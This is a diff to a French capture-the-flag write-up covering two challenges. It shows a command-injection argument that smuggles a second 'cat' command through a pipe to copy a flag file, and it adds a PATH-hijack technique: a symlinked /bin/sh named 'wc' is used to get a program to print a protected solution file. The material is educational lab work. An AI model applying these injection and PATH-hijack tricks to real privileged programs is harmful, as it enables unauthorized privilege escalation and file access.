@@ -94,3 +94,11 @@ ALWAYS KEEP A JOKER.
 >./charp "solution.txt | cat solution.txt > ~/solution10.txt"
 - puis on affiche le contenu du fichier **solution10.txt** avec **cat /home/user/jennifer/solution10.txt** ou simplement avec **cat ~/solution10.txt**
 - la solution ou notre flag se trouve dedans
+
+##Choose your path2
+- après avoir examiné la fonction dans le code source
+- on peut créer un lien symbolique dans notre répertoire personnel avec :
+> ln -s /bin/sh ~/wc
+- puis on modifie la variable d'environnement afin d'inclure uniquement le répertoire personnel où se trouve notre lien symbolique **wc** avec :
+> PATH=~ ./charp2 "/bin/cat solution.txt 1>&2" 
+- la solution s'affiche
